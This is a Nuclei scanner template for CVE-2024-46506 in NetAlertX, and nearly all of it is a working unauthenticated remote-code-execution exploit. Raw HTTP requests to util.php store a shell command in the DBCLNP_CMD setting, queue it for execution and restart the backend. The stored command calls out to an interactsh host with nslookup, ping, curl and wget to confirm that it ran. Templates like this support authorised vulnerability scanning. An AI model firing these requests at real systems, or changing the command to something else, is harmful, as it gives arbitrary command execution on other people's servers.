id: CVE-2024-46506-compat

info:
  name: NetAlertX - Unauth RCE (Compat variant with DNS+HTTP callbacks)
  author: mcy32
  severity: critical
  description: |
    This variant improves reliability by testing both JSON and
    x-www-form-urlencoded payloads, and triggers both DNS and HTTP callbacks
    for safer verification across environments.
  reference:
    - https://rhinosecuritylabs.com/research/cve-2024-46506-rce-in-netalertx/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46506
    - https://github.com/rapid7/metasploit-framework/pull/19437
  classification:
    cve-id: CVE-2024-46506
    cwe-id: CWE-306
    cvss-score: 10.0
  metadata:
    verified: true
    vendor: netalertx
    product: netalertx
  tags: cve,cve2024,netalertx,rce,oast,intrusive,compat

variables:
  oast-dns: "{{interactsh-url}}"
  oast-http: "http://{{interactsh-url}}"

http:
  - raw:
      # JSON body variant
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"function":"savesettings","settings":[
          ["DBCLNP","DBCLNP_RUN","string","*"],
          ["DBCLNP","DBCLNP_CMD","string","/bin/sh -c 'nslookup {{oast-dns}} || ping -c1 {{oast-dns}} || curl -fsSL {{oast-http}} || wget -qO- {{oast-http}}'"],
          ["DBCLNP","DBCLNP_RUN_SCHD","string","* * * * *"]
        ]}

      # Form-encoded variant
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        function=savesettings&settings=%5B%5B%22DBCLNP%22%2C%22DBCLNP_RUN%22%2C%22string%22%2C%22*%22%5D%2C%5B%22DBCLNP%22%2C%22DBCLNP_CMD%22%2C%22string%22%2C%22/bin/sh+-c+'nslookup+{{oast-dns}}+||+ping+-c1+{{oast-dns}}+||+curl+-fsSL+{{oast-http}}+||+wget+-qO-+{{oast-http}}'%22%5D%2C%5B%22DBCLNP%22%2C%22DBCLNP_RUN_SCHD%22%2C%22string%22%2C%22*+*+*+*+*%22%5D%5D

      # enqueue + restart
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"function":"addToExecutionQueue","action":"{{rand_text_alpha(6)}}|run|DBCLNP"}

      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"function":"addToExecutionQueue","action":"{{rand_text_alpha(6)}}|cron_restart_backend"}

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - contains_any(interactsh_protocol, 'http', 'dns')
          - status_code_1 == 200 && status_code_3 == 200 && status_code_4 == 200
        condition: and
